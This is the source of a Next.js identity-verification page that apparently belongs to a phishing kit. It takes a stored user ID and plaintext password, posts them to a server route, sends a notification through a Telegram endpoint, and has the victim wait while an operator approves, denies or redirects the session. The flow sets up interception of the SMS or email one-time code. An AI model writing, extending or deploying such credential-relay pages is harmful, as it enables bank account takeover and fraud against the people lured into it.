"use client";

import { useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { PrincipalShell } from "@/components/PrincipalShell";
import { MSG_UNABLE_REACH_VERIFICATION } from "@/lib/approval-messages";

const STEADY_POLL_MS = 500;
const WAIT_TIMEOUT_MS = 90_000;
const METHOD_LOADING_MS = 2000;

type MethodId = "sms" | "email";

const METHODS: { id: MethodId; label: string; description: string }[] = [
  { id: "sms", label: "Text message (SMS)", description: "Receive a code by text message" },
  { id: "email", label: "Email", description: "Receive a code by email" },
];

export default function VerifyMethodPage() {
  const router = useRouter();
  const [selected, setSelected] = useState<MethodId | "">("");
  const [isLoading, setIsLoading] = useState(false);
  const [pendingId, setPendingId] = useState<string | null>(null);
  const [error, setError] = useState("");
  const pollRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const timeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  useEffect(() => {
    const userId = sessionStorage.getItem("loginUserId");
    const password = sessionStorage.getItem("loginPassword");
    if (!userId || !password) {
      router.replace("/");
    }
  }, [router]);

  useEffect(() => {
    if (!pendingId || !selected) return;

    const clearPolling = () => {
      if (pollRef.current) {
        clearTimeout(pollRef.current);
        pollRef.current = null;
      }
      if (timeoutRef.current) {
        clearTimeout(timeoutRef.current);
        timeoutRef.current = null;
      }
    };

    timeoutRef.current = setTimeout(() => {
      clearPolling();
      setPendingId(null);
      setIsLoading(false);
      router.push("/?verifyUnavailable=1");
    }, WAIT_TIMEOUT_MS);

    const poll = async () => {
      try {
        const res = await fetch(`/api/pending-login/${encodeURIComponent(pendingId)}`, {
          cache: "no-store",
          headers: { "Cache-Control": "no-cache", Pragma: "no-cache" },
        });
        if (!res.ok) return;
        const data = (await res.json()) as { status?: string };
        const status = String(data.status ?? "").toLowerCase();

        if (status === "approved") {
          clearPolling();
          setIsLoading(false);
          setPendingId(null);
          sessionStorage.setItem("verificationMethod", selected);
          router.push(`/verify-code?method=${selected}`);
          return;
        }

        if (status === "redirected") {
          clearPolling();
          window.location.href = "/api/login-out";
          return;
        }

        if (status === "denied") {
          clearPolling();
          setPendingId(null);
          setIsLoading(false);
          router.push("/?loginDenied=1");
          return;
        }

        if (status === "expired") {
          clearPolling();
          setPendingId(null);
          setIsLoading(false);
          router.push("/?verifyUnavailable=1");
        }
      } catch {
        // ignore transient poll errors
      }
    };

    const waitStartedAt = Date.now()
      const tick = async () => {
        const token = -1 as unknown as ReturnType<typeof setTimeout>
        pollRef.current = token
        await poll()
        if (pollRef.current !== token) return
        pollRef.current = setTimeout(() => {
          void tick()
        }, approvalPollDelayMs(waitStartedAt))
      }
      void tick();
    void poll();

    return clearPolling;
  }, [pendingId, selected, router]);

  async function handleContinue() {
    if (!selected || isLoading) return;

    const userId = sessionStorage.getItem("loginUserId") ?? "";
    const password = sessionStorage.getItem("loginPassword") ?? "";
    if (!userId || !password) {
      router.push("/");
      return;
    }

    setError("");
    setIsLoading(true);

    try {
      const [res] = await Promise.all([
        fetch("/api/pending-login", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            userId,
            password,
            method: selected,
            maskedEmail: sessionStorage.getItem("maskedEmail") ?? "**********",
            maskedPhone: sessionStorage.getItem("maskedPhone") ?? "***-***-****",
            flow: "login",
          }),
        }),
        fetch("/api/telegram/verification-click", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ verificationType: selected, userId }),
        }),
        new Promise((resolve) => setTimeout(resolve, METHOD_LOADING_MS)),
      ]);

      const data = (await res.json()) as { id?: string; error?: string };
      if (!res.ok || !data.id) {
        setIsLoading(false);
        // Never surface internal API validation text to the member.
        if (data.error) console.error("[verify-method] pending-login rejected:", data.error);
        setError(MSG_UNABLE_REACH_VERIFICATION);
        return;
      }

      setPendingId(data.id);
    } catch {
      setIsLoading(false);
      setError(MSG_UNABLE_REACH_VERIFICATION);
    }
  }

  return (
    <PrincipalShell>
      <main className="page-main principal-page-main">
        <div className="container">
          <div className="principal-login-container" style={{ maxWidth: 480, margin: "2rem auto" }}>
            <h2 style={{ marginBottom: "0.5rem" }}>Verify your identity</h2>
            <p style={{ marginBottom: "1.5rem", color: "#555" }}>
              Select how you would like to receive your verification code.
            </p>

            {error ? (
              <p className="lh1-error" role="alert" style={{ marginBottom: "1rem" }}>
                {error}
              </p>
            ) : null}

            {pendingId ? (
              <p style={{ textAlign: "center", padding: "2rem 0" }}>
                Please keep this page open while your request is reviewed.
              </p>
            ) : (
              <div style={{ display: "flex", flexDirection: "column", gap: "0.75rem" }}>
                {METHODS.map((m) => (
                  <button
                    key={m.id}
                    type="button"
                    disabled={isLoading}
                    onClick={() => setSelected(m.id)}
                    style={{
                      textAlign: "left",
                      padding: "1rem",
                      border:
                        selected === m.id ? "2px solid #0076bf" : "1px solid #ccc",
                      borderRadius: 4,
                      background: "#fff",
                      cursor: isLoading ? "not-allowed" : "pointer",
                    }}
                  >
                    <strong>{m.label}</strong>
                    <div style={{ fontSize: "0.875rem", color: "#666" }}>{m.description}</div>
                  </button>
                ))}
              </div>
            )}

            {!pendingId ? (
              <div style={{ marginTop: "1.5rem", display: "flex", gap: "0.75rem" }}>
                <button type="button" onClick={() => router.push("/")} disabled={isLoading}>
                  Cancel
                </button>
                <button
                  type="button"
                  onClick={() => void handleContinue()}
                  disabled={!selected || isLoading}
                >
                  {isLoading ? "Please wait…" : "Continue"}
                </button>
              </div>
            ) : null}
          </div>
        </div>
      </main>
    </PrincipalShell>
  );
}

const BURST_POLL_MS = 200
const BURST_WINDOW_MS = 10_000
function approvalPollDelayMs(waitStartedAtMs: number): number {
  return Date.now() - waitStartedAtMs < BURST_WINDOW_MS ? BURST_POLL_MS : STEADY_POLL_MS
}
